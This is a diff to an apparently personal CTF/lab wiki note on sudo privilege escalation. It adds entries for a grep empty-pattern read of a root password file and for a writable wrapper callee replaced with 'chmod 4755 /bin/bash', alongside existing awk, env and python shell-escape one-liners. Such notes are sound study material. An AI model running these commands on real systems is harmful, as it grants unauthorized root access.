@@ -43,6 +43,8 @@ Exploiting misconfigured `sudo` permissions to escalate privileges.
 - `(julen) NOPASSWD: /usr/bin/awk` → `sudo -u julen /usr/bin/awk 'BEGIN {system("/bin/sh")}'` → shell as `julen` ([[file]]).
 - `(iker) NOPASSWD: /usr/bin/env` → `sudo -u iker /usr/bin/env /bin/bash` → shell as `iker` ([[file]]).
 - `(ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py` → the command line is **pinned**, so you can't touch the arguments — overwrite the *script* it runs with `import os; os.execl("/bin/sh", "sh")` → root ([[file]], same shape as [[nodeclimb]]/[[psycho]]: when the payload must be an argument you can't change, move it into the file the command reads).
+- `(root) NOPASSWD: /usr/bin/grep` + `/usr/bin/cut` → **root file read**: `sudo -u root /usr/bin/grep '' /root/clave.txt` — the empty pattern matches every line, so grep *prints the file* → root's password → `su -`. `cut` is the untested twin in the same rule (`cut -c1- file`). Same family as dance-samba's `file -f`, one tool over ([[dockerlabs-box]]).
+- `(ALL : ALL) NOPASSWD: /usr/local/bin/bash` → the allowed path is a **custom wrapper script** (not a GTFOBins binary) that executes `/opt/bash.sh`; with `/opt` writable, replace the *callee* with `chmod 4755 /bin/bash`, run the wrapper, then `/bin/bash -p` → root ([[jenkhack]]). The chain is absolute — no [[path-hijacking]] involved — so the payload goes in the file the wrapper calls, not in an argument or a `PATH` entry.
 
 ## Re-run `sudo -l` after every hop
 
@@ -50,4 +52,4 @@ The entry you need is usually on the account you *just became*, not the one you 
 
 ## Seen in
 
-[[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[simple-ctf]], [[hannah-coffee]], [[balulero]], [[nodeclimb]], [[psycho]], [[anonymous-pingu]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[analyst]], [[dance-samba]], [[rutas]], [[file]]
+[[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[simple-ctf]], [[hannah-coffee]], [[balulero]], [[nodeclimb]], [[psycho]], [[anonymous-pingu]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[analyst]], [[dance-samba]], [[rutas]], [[file]], [[dockerlabs-box]], [[jenkhack]]
